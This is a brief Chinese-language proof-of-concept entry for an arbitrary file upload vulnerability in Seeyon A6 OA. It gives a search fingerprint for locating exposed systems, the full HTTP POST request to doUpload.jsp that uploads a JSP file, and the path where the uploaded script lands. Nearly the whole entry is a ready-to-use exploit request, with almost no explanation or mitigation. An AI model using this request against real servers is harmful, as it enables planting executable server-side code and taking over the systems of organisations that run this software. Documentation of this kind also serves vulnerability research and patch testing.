# 致远A6uploadForm任意文件上传漏洞

- **系统**：致远OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="seeyonDownLoadPic"`
- **请求**：`POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: multipart/form-data; boundary=---------------------------363…`　`Content-Length: 1508`　`Cookie: JSESSIONID=CA218004AFAADF7EC35C09307DBF7324; JSESSIONID=D58108CE272DEF63D6638B76…`

**请求体 / payload**
```
-----------------------------363639458542274369491015178429
Content-Disposition: form-data; name="myfile"; filename="stc.jsp"
Content-Type: application/octet-stream
test
-----------------------------363639458542274369491015178429--

根据响应拼接上传文件位置
/yyoa/portal/upload/1700061612953.jsp
```

**其他**
- 致远A6 uploadForm 任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 致远A6